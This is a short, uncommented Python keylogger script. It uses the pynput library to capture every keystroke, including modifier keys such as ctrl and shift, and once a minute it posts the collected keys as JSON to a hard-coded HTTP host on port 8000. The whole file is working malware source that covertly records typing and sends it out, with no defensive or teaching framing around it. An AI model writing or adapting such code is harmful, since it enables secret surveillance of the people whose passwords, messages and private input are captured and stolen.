from pynput import keyboard
import requests
import time
HOST = "http://192.168.1.28:8000"
keyList = []

def main():
    global keyList
    with keyboard.Listener(on_press=on_press) as listener:
        while True:
            time.sleep(60)
            posting(HOST, keyList)
            keyList = []
        listener.join()
        

def on_press(key):
    try:
        keyList.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            keyList.append(" ")
        elif key == keyboard.Key.ctrl_l:
            keyList.append("ctrl")
        elif key == keyboard.Key.shift:
            keyList.append("shift")
        else:
            keyList.append(str(key))

def posting(host, value):
    requests.post(host, json={"key": value})


if __name__ == "__main__":
    main()
